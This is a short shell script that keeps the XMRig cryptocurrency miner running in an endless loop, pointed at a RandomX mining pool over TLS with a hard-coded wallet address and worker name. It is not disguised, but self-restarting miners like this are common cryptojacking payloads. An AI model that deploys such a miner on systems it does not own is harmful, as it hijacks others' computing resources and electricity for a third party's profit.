#!/bin/sh
while [ 1 ]; do
	./xmrig -a randomx  -o randomx.rplant.xyz:17080 --tls -u 48jMvqBG3tXhSqmd99gKuNHcdyGBhTPDk4UHbH3F7wvi9ZzY3dVtCUXHASBD46AwRwiQD7CfBHW2iJqxrEZ9Ffji6au93KZ.edan
	sleep 5
done
